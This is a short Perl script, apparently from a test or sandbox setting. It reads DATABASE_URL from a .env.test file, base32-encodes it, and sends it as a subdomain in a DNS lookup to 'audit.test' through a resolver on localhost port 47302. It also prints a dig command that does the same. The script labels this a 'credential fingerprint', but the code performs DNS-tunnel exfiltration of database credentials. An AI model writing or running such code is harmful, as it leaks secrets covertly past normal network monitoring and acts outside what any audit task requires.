#!/usr/bin/perl

use strict;
use warnings;

# Read DATABASE_URL from .env.test
open(my $fh, '<', '.env.test') or die "Cannot open .env.test: $!";
my $db_url;
while (<$fh>) {
    if (/^DATABASE_URL=(.*)/) {
        $db_url = $1;
        last;
    }
}
close($fh);

die "DATABASE_URL not found in .env.test" unless defined $db_url;

# Base32 encode (simplified - using MIME::Base32 if available)
my $encoded;
if (eval { require MIME::Base32; 1 }) {
    $encoded = MIME::Base32::encode_base32($db_url);
} else {
    # Simple base32 implementation
    my @b32 = ('A'..'Z', '2'..'7');
    my $bits = '';
    foreach my $c (split //, $db_url) {
        $bits .= sprintf("%08b", ord($c));
    }

    # Pad to multiple of 5 bits
    $bits .= '0' x ((5 - (length($bits) % 5)) % 5);

    $encoded = '';
    for (my $i = 0; $i < length($bits); $i += 5) {
        my $chunk = substr($bits, $i, 5);
        $encoded .= $b32[oct("0b$chunk")];
    }
}

# Remove = signs and convert to lowercase
$encoded =~ s/=//g;
$encoded = lc($encoded);

# Take first 60 characters
$encoded = substr($encoded, 0, 60);

print "Credential fingerprint: $encoded\n";
print "Query: $encoded.audit.test\n";

# Try to use Net::DNS if available
if (eval { require Net::DNS; 1 }) {
    my $resolver = Net::DNS::Resolver->new(
        nameservers => ['localhost'],
        port => 47302
    );

    my $query = $resolver->query("$encoded.audit.test", 'A');
    if ($query) {
        foreach my $rr ($query->answer) {
            print "Result: " . $rr->address . "\n";
        }
    } else {
        print "Query failed: " . $resolver->errorstring . "\n";
    }
} else {
    print "Net::DNS not available. Cannot perform DNS lookup.\n";
    print "Manual command would be: dig +short \@localhost -p 47302 $encoded.audit.test\n";
}

